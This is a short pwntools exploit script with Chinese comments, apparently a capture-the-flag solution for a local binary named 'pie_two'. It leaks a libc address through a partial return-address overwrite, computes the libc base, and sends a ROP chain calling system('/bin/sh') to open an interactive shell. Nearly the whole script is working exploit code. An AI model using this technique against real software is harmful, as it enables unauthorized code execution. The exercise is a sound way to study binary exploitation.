# 方法一 断点调试frintf，问题是函数最后三位不一样，不好溢出，可能需要爆破
# 但是看寄存器，发现RDI寄存器保存了一个函数地址，可以通过puts函数泄露函数地址
# 会发现这样又调用了一次vuln函数
# 可以计算出libc_base 然后通过libc文件构造ROP,前提是需要提供libc文件才能正常打linc
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "rdi"
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = process('./pie_two')
elf = ELF('./pie_two')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# gdb.attach(p,'b *$rebase(0x1236)')
payload = 0x10*b'a' + p8(0x57)
p.sendafter(b'>>\n',payload)
funlockfile = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = funlockfile - libc.sym['funlockfile']#找不到就自己算
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

# 开始执行第二遍vuln
rdi = libc_base + 0x2a3e5
ret = libc_base + 0x29cd6

payload = 0x10*b'a' + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)
p.sendafter(b'>>\n',payload)

# pause()
p.interactive()